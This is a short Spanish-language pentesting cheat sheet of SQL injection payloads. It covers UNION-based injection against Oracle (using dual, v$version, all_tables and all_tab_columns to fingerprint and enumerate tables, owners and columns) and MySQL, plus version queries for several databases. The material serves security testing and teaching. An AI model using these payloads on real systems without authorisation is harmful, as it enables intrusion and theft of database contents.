### Oracle
A la hora de hacer reconocimiento o pentesting a bases de datos oracle hay que tener en cuenta que cuando por ejemplo ordenamos con NULL no sirve hacer simplemente `' union select NULL,NULL-- -` ya que en oracle hay que siempre apuntar a una tabla de la siguiente manera `' union select NULL,NULL from dual-- -` dual es una tabla que se encuentra en la mayoría de DB oracle
--> `union select NULL,banner from v$version-- -`

---
Cuando queremos listar las DB debemos de usar la siguiente query
`union select NULL,table_name from all_tables`

En caso de querer ver los owners de todas las tablas
`union select NULL,owner from all_tables`

Ademas podemos acotar y ver las tabla las cuales pertenecen a un owner
`union select NULL,table_name from all_tables where owner='nombredelowner'`

A la hora de dumpear las columnas usamos
`union select NULL,column_name from all_tab_columns`

### MySQL
-->`union select NULL,@@version-- -`

En caso de querer averiguar la version de la DB las querys son:
Database type: **Query**
Microsoft, MySQL: `SELECT @@version`
Oracle `SELECT * FROM v$version`
PostgreSQL `SELECT version()`

